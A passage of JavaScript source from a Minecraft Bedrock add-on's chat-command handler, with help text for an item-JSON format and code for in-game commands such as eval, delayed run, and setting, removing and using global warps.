stack of 16 unbreaking 3 mending 1 shields that are locked to a specific slot and are kept on death: {"minecraft:components": {"enchantable": {"addList": [{"level": 1, "type": "mending"}, {"type": "unbreaking", "level": 3}]}}, "id": "shield", "count": 16, "keepondeath": true, "lockMode": "slot"}`);
                        break;
                    case "help itemjsonformatcmpr":
                        eventData.sender.sendMessage(`itemJSON Format: 
${`export interface ItemJSONParseInput {
"name"?: string,
"minecraft:name"?: string,
"nameTag"?: string,
"minecraft:nameTag"?: string,
"lore"?: string[],
"minecraft:lore"?: string[],
"description"?: string[],
"minecraft:description"?: string[],
"count"?: number,
"minecraft:count"?: number,
"amount"?: number,
"minecraft:amount"?: number,
"keepOnDeath"?: boolean,
"minecraft:keepOnDeath"?: boolean,
"keepondeath"?: boolean,
"minecraft:keepondeath"?: boolean,
"keep_on_death"?: boolean,
"minecraft:keep_on_death"?: boolean,
"lockMode"?: ItemLockMode,
"minecraft:lockMode"?: ItemLockMode,
"lockmode"?: ItemLockMode,
"minecraft:lockmode"?: ItemLockMode,
"lock_mode"?: ItemLockMode,
"minecraft:lock_mode"?: ItemLockMode,
"itemLockMode"?: ItemLockMode,
"minecraft:itemLockMode"?: ItemLockMode,
"itemlockmode"?: ItemLockMode,
"minecraft:itemlockmode"?: ItemLockMode,
"item_lock_mode"?: ItemLockMode,
"minecraft:item_lock_mode"?: ItemLockMode,
"canPlaceOn"?: string[],
"minecraft:canPlaceOn"?: string[],
"canplaceon"?: string[],
"minecraft:canplaceon"?: string[],
"can_place_on"?: string[],
"minecraft:can_place_on"?: string[],
"canDestroy"?: string[],
"minecraft:canDestroy"?: string[],
"candestroy"?: string[],
"minecraft:candestroy"?: string[],
"can_destroy"?: string[],
"minecraft:can_destroy"?: string[],
"components"?: {
"enchantable"?: {
"add"?: Enchantment|Enchantment[],
"minecraft:add"?: Enchantment|Enchantment[],
"addEnchantment"?: Enchantment|Enchantment[],
"minecraft:addEnchantment"?: Enchantment|Enchantment[],
"addList"?: Enchantment[],
"minecraft:addList"?: Enchantment[],
"addEnchantments"?: Enchantment[],
"minecraft:addEnchantments"?: Enchantment[],
"remove"?: Enchantment,
"minecraft:remove"?: Enchantment,
"removeEnchantments"?: Enchantment,
"minecraft:removeEnchantments"?: Enchantment,
"clear"?: any,
"minecraft:clear"?: any,
"clearAll"?: any,
"minecraft:clearAll"?: any,
"removeAll"?: any,
"minecraft:removeAll"?: any,
"removeAllEnchantments"?: any,
"minecraft:removeAllEnchantments"?: any
},
"minecraft:enchantable"?: {
"add"?: Enchantment|Enchantment[],
"minecraft:add"?: Enchantment|Enchantment[],
"addEnchantment"?: Enchantment|Enchantment[],
"minecraft:addEnchantment"?: Enchantment|Enchantment[],
"addList"?: Enchantment[],
"minecraft:addList"?: Enchantment[],
"addEnchantments"?: Enchantment[],
"minecraft:addEnchantments"?: Enchantment[],
"remove"?: Enchantment,
"minecraft:remove"?: Enchantment,
"removeEnchantments"?: Enchantment,
"minecraft:removeEnchantments"?: Enchantment,
"clear"?: any,
"minecraft:clear"?: any,
"clearAll"?: any,
"minecraft:clearAll"?: any,
"removeAll"?: any,
"minecraft:removeAll"?: any,
"removeAllEnchantments"?: any,
"minecraft:removeAllEnchantments"?: any
},
"durability"?: {
"durability"?: number,
"minecraft:durability"?: number,
"setDurability"?: number,
"minecraft:setDurability"?: number,
"damage"?: number,
"minecraft:damage"?: number,
"setDamage"?: number,
"minecraft:setDamage"?: number,
"repair"?: number,
"minecraft:repair"?: number,
"setDurabilityToMax"?: any,
"minecraft:setDurabilityToMax"?: any
},
"minecraft:durability"?: {
"durability"?: number,
"minecraft:durability"?: number,
"setDurability"?: number,
"minecraft:setDurability"?: number,
"damage"?: number,
"minecraft:damage"?: number,
"setDamage"?: number,
"minecraft:setDamage"?: number,
"repair"?: number,
"minecraft:repair"?: number,
"setDurabilityToMax"?: any,
"minecraft:setDurabilityToMax"?: any
},
"damage"?: {
"durability"?: number,
"minecraft:durability"?: number,
"setDurability"?: number,
"minecraft:setDurability"?: number,
"damage"?: number,
"minecraft:damage"?: number,
"setDamage"?: number,
"minecraft:setDamage"?: number,
"repair"?: number,
"minecraft:repair"?: number,
"setDurabilityToMax"?: any,
"minecraft:setDurabilityToMax"?: any
},
"minecraft:damage"?: {
"durability"?: number,
"minecraft:durability"?: number,
"setDurability"?: number,
"minecraft:setDurability"?: number,
"damage"?: number,
"minecraft:damage"?: number,
"setDamage"?: number,
"minecraft:setDamage"?: number,
"repair"?: number,
"minecraft:repair"?: number,
"setDurabilityToMax"?: any,
"minecraft:setDurabilityToMax"?: any
},
"cooldown"?: any,
"minecraft:cooldown"?: any,
"food"?: any,
"minecraft:food"?: any
},
"minecraft:components"?: {
"enchantable"?: {
"add"?: Enchantment|Enchantment[],
"minecraft:add"?: Enchantment|Enchantment[],
"addEnchantment"?: Enchantment|Enchantment[],
"minecraft:addEnchantment"?: Enchantment|Enchantment[],
"addList"?: Enchantment[],
"minecraft:addList"?: Enchantment[],
"addEnchantments"?: Enchantment[],
"minecraft:addEnchantments"?: Enchantment[],
"remove"?: Enchantment,
"minecraft:remove"?: Enchantment,
"removeEnchantments"?: Enchantment,
"minecraft:removeEnchantments"?: Enchantment,
"clear"?: any,
"minecraft:clear"?: any,
"clearAll"?: any,
"minecraft:clearAll"?: any,
"removeAll"?: any,
"minecraft:removeAll"?: any,
"removeAllEnchantments"?: any,
"minecraft:removeAllEnchantments"?: any
},
"minecraft:enchantable"?: {
"add"?: Enchantment|Enchantment[],
"minecraft:add"?: Enchantment|Enchantment[],
"addEnchantment"?: Enchantment|Enchantment[],
"minecraft:addEnchantment"?: Enchantment|Enchantment[],
"addList"?: Enchantment[],
"minecraft:addList"?: Enchantment[],
"addEnchantments"?: Enchantment[],
"minecraft:addEnchantments"?: Enchantment[],
"remove"?: Enchantment,
"minecraft:remove"?: Enchantment,
"removeEnchantments"?: Enchantment,
"minecraft:removeEnchantments"?: Enchantment,
"clear"?: any,
"minecraft:clear"?: any,
"clearAll"?: any,
"minecraft:clearAll"?: any,
"removeAll"?: any,
"minecraft:removeAll"?: any,
"removeAllEnchantments"?: any,
"minecraft:removeAllEnchantments"?: any
},
"durability"?: {
"durability"?: number,
"minecraft:durability"?: number,
"setDurability"?: number,
"minecraft:setDurability"?: number,
"damage"?: number,
"minecraft:damage"?: number,
"setDamage"?: number,
"minecraft:setDamage"?: number,
"repair"?: number,
"minecraft:repair"?: number,
"setDurabilityToMax"?: any,
"minecraft:setDurabilityToMax"?: any
},
"minecraft:durability"?: {
"durability"?: number,
"minecraft:durability"?: number,
"setDurability"?: number,
"minecraft:setDurability"?: number,
"damage"?: number,
"minecraft:damage"?: number,
"setDamage"?: number,
"minecraft:setDamage"?: number,
"repair"?: number,
"minecraft:repair"?: number,
"setDurabilityToMax"?: any,
"minecraft:setDurabilityToMax"?: any
},
"damage"?: {
"durability"?: number,
"minecraft:durability"?: number,
"setDurability"?: number,
"minecraft:setDurability"?: number,
"damage"?: number,
"minecraft:damage"?: number,
"setDamage"?: number,
"minecraft:setDamage"?: number,
"repair"?: number,
"minecraft:repair"?: number,
"setDurabilityToMax"?: any,
"minecraft:setDurabilityToMax"?: any
},
"minecraft:damage"?: {
"durability"?: number,
"minecraft:durability"?: number,
"setDurability"?: number,
"minecraft:setDurability"?: number,
"damage"?: number,
"minecraft:damage"?: number,
"setDamage"?: number,
"minecraft:setDamage"?: number,
"repair"?: number,
"minecraft:repair"?: number,
"setDurabilityToMax"?: any,
"minecraft:setDurabilityToMax"?: any
},
"cooldown"?: any,
"minecraft:cooldown"?: any,
"food"?: any,
"minecraft:food"?: any
}
force?: boolean
source?: {
type?: string,
targetSelector?: string,
targetSelectorExecutionLocation?: DimensionLocation,
targetSelectorSourceEntity?: Entity,
player?: string,
entityAtBlock?: DimensionLocation,
entityType?: string,
entityTypeId?: string,
entityId?: string|number,
block?: DimensionLocation,
slot?: number,
id?: string,
itemId?: string,
count?: number,
amount?: number
},
type?: string,
id?: string,
itemId?: string,
new?: [string, number?],
dynamicProperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
dynamicproperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
properties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
itemproperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
itemProperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>
clearAllDynamicProperties?: any,
clearDynamicProperties?: any,
clearalldynamicproperties?: any,
cleardynamicproperties?: any,
removeDynamicProperties?: string[],
removedynamicproperties?: string[],
removeDynamicProperty?: string,
removedynamicproperty?: string,
"minecraft:dynamicProperties"?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
"minecraft:dynamicproperties"?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
"minecraft:properties"?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
"minecraft:itemProperties"?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
"minecraft:itemproperties"?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
"minecraft:clearAllDynamicProperties"?: any,
"minecraft:clearDynamicProperties"?: any,
"minecraft:clearalldynamicproperties"?: any,
"minecraft:cleardynamicproperties"?: any,
"minecraft:removeDynamicProperties"?: string[],
"minecraft:removedynamicproperties"?: string[],
"minecraft:removeDynamicProperty"?: string,
"minecraft:removedynamicproperty"?: string
}
examples: 
stack of 255 sharpness 1 wooden swords: {"minecraft:components": {"enchantable": {"add": {"level": 1, "type": "sharpness"}}}, "id": "wooden_sword", "count": 255}
sharpness 5 fortune 3 efficiency 5 iron axe that cannot be dropped and are kept on death with the name "§4Storage Hog Axe§r" and the lore "§eTakes\\nUp\\nYour\\nInventory§r" (with the \\n as line break characters) that says lol in the chat and damages the user when used: {"minecraft:components": {"enchantable": {"add": [{"level": 1, "type": "sharpness"}, {"type": "fortune", "level": 3}, {"type": "efficiency", "level": 5}]}}, "id": "iron_axe", "count": 72, "keepondeath": true, "lockMode": "inventory", "name": "§r§4Storage Hog Axe§r§f", "lore": ["§r§eTakes\\nUp§r§f","§r§eYour\\nInventory§r§f"], "dynamicProperties": {"code": "world.sendMessage('lol'); event.source.runCommandAsync(\\"/damage @s 1 thorns entity @s\\")"}}
stack of 16 unbreaking 3 mending 1 shields that are locked to a specific slot and are kept on death: {"minecraft:components": {"enchantable": {"addList": [{"level": 1, "type": "mending"}, {"type": "unbreaking", "level": 3}]}}, "id": "shield", "count": 16, "keepondeath": true, "lockMode": "slot"}`.replaceAll("\n", "")}`);
                        break;
                    case "help itemjsonformatsimplified":
                        eventData.sender.sendMessage(`simplified itemJSON format (type "${String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\")}help itemJSONFormat" to see full format options): 
{
    "name"?: string,
    "lore"?: string[],
    "count"?: number,
    "keepondeath"?: boolean,
    "lockmode"?: ItemLockMode,
    "canplaceon"?: string[],
    "components"?: {
        "enchantable"?: {
            "add"?: Enchantment|Enchantment[],
            "addList"?: Enchantment[],
            "remove"?: Enchantment,
            "removeEnchantments"?: Enchantment,
            "clear"?: any
        },
        "durability"?: {
            "durability"?: number,
            "damage"?: number,
            "repair"?: number,
            "setDurabilityToMax"?: any
        },
        "damage"?: {
            "durability"?: number,
            "damage"?: number,
            "repair"?: number,
            "setDurabilityToMax"?: any
        }
    },
    force?: boolean
    source?: {
        type?: string,
        targetSelector?: string,
        targetSelectorExecutionLocation?: DimensionLocation,
        targetSelectorSourceEntity?: Entity,
        player?: string,
        entityAtBlock?: DimensionLocation,
        entityType?: string,
        entityTypeId?: string,
        entityId?: string|number,
        block?: DimensionLocation,
        slot?: number,
        id?: string,
        itemId?: string,
        count?: number,
        amount?: number
    },
    type?: string,
    dynamicproperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    cleardynamicproperties?: any,
    removedynamicproperties?: string[],
    removedynamicproperty?: string
}
examples: 
stack of 255 sharpness 1 wooden swords: {"minecraft:components": {"enchantable": {"add": {"level": 1, "type": "sharpness"}}}, "id": "wooden_sword", "count": 255}
sharpness 5 fortune 3 efficiency 5 iron axe that cannot be dropped and are kept on death with the name "§4Storage Hog Axe§r" and the lore "§eTakes\\nUp\\nYour\\nInventory§r" (with the \\n as line break characters) that says lol in the chat and damages the user when used: {"minecraft:components": {"enchantable": {"add": [{"level": 1, "type": "sharpness"}, {"type": "fortune", "level": 3}, {"type": "efficiency", "level": 5}]}}, "id": "iron_axe", "count": 72, "keepondeath": true, "lockMode": "inventory", "name": "§r§4Storage Hog Axe§r§f", "lore": ["§r§eTakes\\nUp§r§f","§r§eYour\\nInventory§r§f"], "dynamicProperties": {"code": "world.sendMessage('lol'); event.source.runCommandAsync(\\"/damage @s 1 thorns entity @s\\")"}}
stack of 16 unbreaking 3 mending 1 shields that are locked to a specific slot and are kept on death: {"minecraft:components": {"enchantable": {"addList": [{"level": 1, "type": "mending"}, {"type": "unbreaking", "level": 3}]}}, "id": "shield", "count": 16, "keepondeath": true, "lockMode": "slot"}`);
                        break;
                    default:
                        eventData.sender.sendMessage("§cSyntax error: Unexpected \"" + newMessage.slice(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\").length + 4) + "\": at \"" + String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\") + "help >>" + newMessage.slice(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\").length + 5) + "<<\"");
                        break;
                }
                break;
            case !!switchTest.match(/^getuuid$/):
                eventData.cancel = true;
                try {
                    system.runTimeout(() => { eventData.sender.sendMessage(String(targetSelector(newMessage.slice(23), "", Number(eventData.sender.id)))); }, 2);
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^run$/):
                eventData.cancel = true;
                try {
                    system.runTimeout(() => { let a = player.runCommand(newMessage.split(" ").slice(2).join(" ")); eventData.sender.sendMessage(String(a.successCount)); if (a.successCount != 0.0) {
                        targetSelectorAllListE("@a [tag=canSeeCustomChatCommandFeedbackFromMods]", player.location.x + " " + player.location.y + " " + player.location.z).forEach((entity) => { entity.sendMessage(String("{§l§dCMDFEED§r§f}[" + player.name + "§r§f]: " + a + " Successfully waited " + Number(newMessage.split(" ")[1]) + " ticks and executed the command: " + newMessage.slice(Number(newMessage.split(" ")[1]) + 5))); });
                    } }, Number(newMessage.split(" ")[1]));
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^eval$/):
                eventData.cancel = true;
                try {
                    eval(newMessage.slice(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\").length + 5));
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^warpset$/):
                eventData.cancel = true;
                let warpList = String(world.getDynamicProperty("globalWarpListValues")).split("||||"); /*
                console.warn("wasdqrte\\sanwqhieasdrt\\p\\nasqw".replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f")*/ /*.replaceAll(/[\\x]/g, "\x").replaceAll(/[\\u]/g, "\u")*/ /*.replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, ""))*/
                if (newMessage.split(" ").slice(5).join(" ").escapeCharactersB(true).e == undefined)
                    switch (warpList.find((findWarp) => (findWarp.split(", ")[0] == newMessage.split(" ").slice(5).join(" ") /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/.replaceAll(", ", " ").replaceAll("|", "\\u007c"))) == undefined) {
                        case false: /*
                        if (newMessage.split(" ").slice(5).join(" ").replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "").replaceAll(", ", " ") == ""){*/ /*eventData.sender.sendMessage("§cError: missing required \"name\" field. "); */ /*break; */ /*}*/
                            try {
                                warpList[warpList.findIndex((warpItem) => (warpItem.split(", ")[0] == newMessage.split(" ").slice(5).join(" ") /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/.replaceAll(", ", " ").replaceAll("|", "\\u007c")))] = String(newMessage.split(" ").slice(5).join(" ").replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "").replaceAll(", ", " ") + ", " + world.getDimension(newMessage.split(" ")[1]).id + ", " + Number(newMessage.split(" ")[2]) + ", " + Number(newMessage.split(" ")[3]) + ", " + Number(newMessage.split(" ")[4]));
                            }
                            catch (e) {
                                eventData.sender.sendMessage("§c" + e + e.stack);
                                break;
                            }
                            try {
                                system.run(() => { world.setDynamicProperty("globalWarpListValues", warpList.join("||||")); });
                            }
                            catch (e) {
                                eventData.sender.sendMessage("§c" + e + e.stack);
                            }
                            try {
                                eventData.sender.sendMessage("Set global warp \"" + newMessage.split(" ").slice(5).join(" ").escapeCharacters(true) /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/.replaceAll(", ", " ") + "\" at dimension: " + newMessage.split(" ")[1] + ", x: " + newMessage.split(" ")[2] + ", y: " + newMessage.split(" ")[3] + ", z: " + newMessage.split(" ")[4] + ". ");
                            }
                            catch (e) {
                                eventData.sender.sendMessage("§c" + e + e.stack);
                            }
                            break;
                        case true:
                            try {
                                warpList.push(String(newMessage.split(" ").slice(5).join(" ") /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/.replaceAll(", ", " ").replaceAll("|", "\\u007c") + ", " + newMessage.split(" ")[1] + ", " + newMessage.split(" ")[2] + ", " + newMessage.split(" ")[3] + ", " + newMessage.split(" ")[4]));
                            }
                            catch (e) {
                                eventData.sender.sendMessage("§c" + e + e.stack);
                            }
                            try {
                                system.run(() => { world.setDynamicProperty("globalWarpListValues", warpList.join("||||")); });
                            }
                            catch (e) {
                                eventData.sender.sendMessage("§c" + e + e.stack);
                            }
                            try {
                                eventData.sender.sendMessage("Added global warp \"" + newMessage.split(" ").slice(5).join(" ").escapeCharacters(true) /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/.replaceAll(", ", " ") + "\" at dimension: " + newMessage.split(" ")[1] + ", x: " + newMessage.split(" ")[2] + ", y: " + newMessage.split(" ")[3] + ", z: " + newMessage.split(" ")[4] + ". ");
                            }
                            catch (e) {
                                eventData.sender.sendMessage("§c" + e + e.stack);
                            }
                            break;
                    }
                break;
            case !!switchTest.match(/^warpremove$/):
                eventData.cancel = true;
                let warpListB = String(world.getDynamicProperty("globalWarpListValues")).split("||||"); /*
                console.warn("wasdqrte\\sanwqhieasdrt\\p\\nasqw".replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f")*/ /*.replaceAll(/[\\x]/g, "\x").replaceAll(/[\\u]/g, "\u")*/ /*.replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, ""))*/
                switch (warpListB.find((findWarp) => (findWarp.split(", ")[0].escapeCharacters(true).replaceAll(", ", " ").replaceAll("|", "\\u007c") == newMessage.split(" ").slice(1).join(" ").escapeCharacters(true) /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/.replaceAll(", ", " ").replaceAll("|", "\\u007c"))) == undefined) {
                    case false:
                        try {
                            system.run(() => { warpListB[warpListB.findIndex((findWarp) => (findWarp.split(", ")[0].escapeCharacters(true).replaceAll(", ", " ").replaceAll("|", "\\u007c") == newMessage.split(" ").slice(1).join(" ").escapeCharacters(true) /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/.replaceAll(", ", " ").replaceAll("|", "\\u007c")))] = undefined; world.setDynamicProperty("globalWarpListValues", warpListB.join("||||")); });
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        try {
                            eventData.sender.sendMessage("Removed global warp with name \"" + newMessage.split(" ").slice(1).join(" ").escapeCharacters(true) /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/.replaceAll(", ", " ") + "\". ");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                    case true:
                        try {
                            eventData.sender.sendMessage("§cError: could not find global warp \"" + newMessage.split(" ").slice(1).join(" ").escapeCharacters(true) /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/.replaceAll(", ", " ") + "\". ");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                }
                break;
            case !!switchTest.match(/^warp$/):
                eventData.cancel = true;
                let warpListD = String(world.getDynamicProperty("globalWarpListValues")).split("||||");
                let warp = undefined; /*
                console.warn("wasdqrte\\sanwqhieasdrt\\p\\nasqw".replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f")*/ /*.replaceAll(/[\\x]/g, "\x").replaceAll(/[\\u]/g, "\u")*/ /*.replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, ""))*/
                switch (warpListD.find((findWarp) => (findWarp.split(", ")[0].escapeCharacters(true).replaceAll("|", "\\u007c") == newMessage.split(" ").slice(1).join(" ").escapeCharacters(true) /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/.replaceAll("|", "\\u007c"))) == undefined) {
                    case false:
                        try {
                            warp = warpListD.find((findWarp) => (findWarp.split(", ")[0].escapeCharacters(true).replaceAll("|", "\\u007c") == newMessage.split(" ").slice(1).join(" ").escapeCharacters(true) /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/.replaceAll("|", "\\u007c"))).split(", ");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        try {
                            system.run(() => { player.teleport({ x: Number(warp[2]), y: Number(warp[3]), z: Number(warp[4]) }, { dimension: world.getDimension(String(warp[1])), keepVelocity: false }); });
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        try {
                            eventData.sender.sendMessage("Warped to \"" + newMessage.split(" ").slice(1).join(" ").escapeCharacters(true) /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/ + "\". ");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                    case true:
                        try {
                            eventData.sender.sendMessage("§cError: could not find global warp \"" + newMessage.split(" ").slice(1).join(" ").escapeCharacters(true) /*.replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "")*/ + "\". ");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                }
                break;
            case !!switchTest.match(/^warplistdetails$/):
                eventData.cancel = true;
                let warpListC = String(world.getDynamicProperty("globalWarpListValues")).split("||||");
                if (warpListC.length == 1) {
                    eventData.sender.sendMessage("You have no global warps, set them with \\warpset");
                }
                else {
                    try {
                        eventData.sender.sendMessage(warpListC.join("\n").escapeCharacters(true));
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
